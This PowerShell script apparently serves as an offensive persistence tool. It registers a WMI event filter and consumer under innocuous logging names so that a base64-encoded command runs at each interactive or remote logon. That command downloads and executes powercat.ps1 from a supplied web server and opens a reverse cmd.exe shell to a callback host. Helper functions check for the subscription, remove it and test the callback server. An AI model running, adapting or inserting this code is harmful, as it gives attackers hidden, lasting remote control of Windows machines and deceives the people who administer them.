function Get-Subscriber {
    $CheckForSubscriber=Get-WmiObject -Namespace root\subscription -class __EventFilter -Filter "Name='LogNewProcesses'"
    if ($checkForSubscriber -eq $null ) {
        write-host "No subscriber running"}
    else {
        write-host "Subscriber running"}
 }
 
 function Remove-Subscriber {
     Get-wmiobject -Namespace root\subscription -Class __EventFilter -Filter "Name='LogNewProcesses'" | Remove-WmiObject -Verbose
     Get-WmiObject -Namespace root\subscription -class CommandLineEventConsumer -Filter "Name='LogNewProcessConsumer'" | Remove-WmiObject -Verbose
     Get-WmiObject -namespace root\subscription -Class __FilterToConsumerBinding -Filter "__Path LIKE '%LogNewProcesses%'" | Remove-WmiObject -Verbose
 }
 
 function Test-CallBackServer {
    $tcp=new-object system.net.sockets.tcpclient
    $tcp.connect($callBackServer, $port)
}

function Invoke-Subscriber {
    param(
    [parameter(Mandatory=$true)]
    [string]$webServer,
    [string]$callBackServer,
    [string]$callBackPort
    )
    
    $DownloadFile="http://$($webserver)/powercat.ps1"
    $callBackURL="https://$($callBackServer):8000"
    
    $completeCommand="iex(new-object net.webclient).downloadstring('$downloadFile');powercat -c '$callBackServer' -p '$callBackPort' -e cmd.exe"
    write-output $completeCommand
    $bytes=[System.Text.Encoding]::Unicode.GetBytes($completeCommand)
    $EncodedText=[Convert]::ToBase64String($bytes)
    
    $wmiParams=@{
        Computername = $env:COMPUTERNAME
        ErrorAction = 'Stop'
        NameSpace= 'root\subscription'
    }
    
    $wmiParams.Class = '__EventFilter'
    $wmiParams.Arguments = @{
        Name = 'LogNewProcesses'
        EventNamespace = 'root\CimV2'
        QueryLanguage = 'WQL'
        Query = "Select * FROM __InstanceCreationEvent WITHIN 240 WHERE targetInstance ISA 'win32_logonsession' AND ( TargetInstance.LogonType = '10' OR TargetInstance.Logontype='2')"
        }    
    $filterResult = Set-WmiInstance @wmiParams
        
    
   $wmiParams.Class = 'CommandLineEventConsumer'
   $wmiParams.Arguments = @{
        Name='LogNewProcessConsumer'
        CommandLineTemplate = "powershell.exe -noprofile -encodedCommand $($encodedText)"
        RunInteractively = 'False'
        }
    $consumerResult = Set-WmiInstance @wmiParams
    
    $wmiParams.class = '__FilterToConsumerBinding'
    $wmiParams.Arguments = @{
        Filter = $filterResult
        Consumer = $consumerResult
    }
$bindingResult = Set-WmiInstance @wmiparams

}


             
 
    
    